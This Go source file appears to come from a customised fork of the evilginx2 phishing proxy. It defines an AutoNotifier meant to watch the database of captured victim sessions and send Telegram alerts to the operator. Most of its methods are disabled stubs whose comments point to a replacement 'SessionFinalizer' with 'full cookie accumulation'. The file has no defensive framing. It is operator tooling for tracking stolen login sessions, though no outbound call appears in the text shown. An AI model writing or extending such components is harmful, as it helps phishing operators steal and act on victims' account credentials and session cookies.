package core

import (
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// AutoNotifier monitors for new sessions and automatically sends telegram notifications
type AutoNotifier struct {
	db               *database.Database
	telegramNotifier *TelegramNotifier
	exportDir        string
	notifiedSessions map[string]bool // Track which sessions have been notified
	stopChan         chan bool
	running          bool
	mu               sync.Mutex // Protect notifiedSessions map
	lastNotifyTime   time.Time  // Track last notification time for rate limiting
}

func NewAutoNotifier(db *database.Database, telegramNotifier *TelegramNotifier, exportDir string) *AutoNotifier {
	an := &AutoNotifier{
		db:               db,
		telegramNotifier: telegramNotifier,
		exportDir:        exportDir,
		notifiedSessions: make(map[string]bool),
		stopChan:         make(chan bool),
		running:          false,
		lastNotifyTime:   time.Now(),
	}

	// COMPLETELY DISABLED: AutoNotifier replaced with SessionFinalizer
	log.Important("🚫 AUTO-NOTIFIER CONSTRUCTOR: DISABLED - SessionFinalizer handles all notifications")

	return an
}

// Mark all existing sessions as notified so we don't spam on restart
func (an *AutoNotifier) initializeExistingSessions() {
	// DISABLED: AutoNotifier functionality removed
	// SessionFinalizer handles all notifications with BULLETPROOF validation
	return
}

func (an *AutoNotifier) Start() {
	// DISABLED: AutoNotifier completely replaced with SessionFinalizer
	// SessionFinalizer provides BULLETPROOF validation for complete data
	log.Important("🚫 OLD AUTO-NOTIFIER DISABLED - Using SessionFinalizer for BULLETPROOF validation")
	return
}

func (an *AutoNotifier) Stop() {
	if !an.running {
		return
	}

	log.Info("auto-notifier: stopping...")
	an.stopChan <- true
	an.running = false
}

func (an *AutoNotifier) monitorLoop() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			an.checkForNewSessions()
		case <-an.stopChan:
			log.Info("auto-notifier: stopped")
			return
		}
	}
}

func (an *AutoNotifier) checkForNewSessions() {
	// COMPLETELY DISABLED: AutoNotifier replaced with SessionFinalizer
	// SessionFinalizer provides superior BULLETPROOF validation with full cookie accumulation
	return
}

// MarkNotified manually marks a session as notified (used by primary trigger to avoid duplicates)
func (an *AutoNotifier) MarkNotified(sessionId string) {
	an.mu.Lock()
	defer an.mu.Unlock()

	an.notifiedSessions[sessionId] = true
	log.Debug("auto-notifier: marked session %s as notified", sessionId)
}
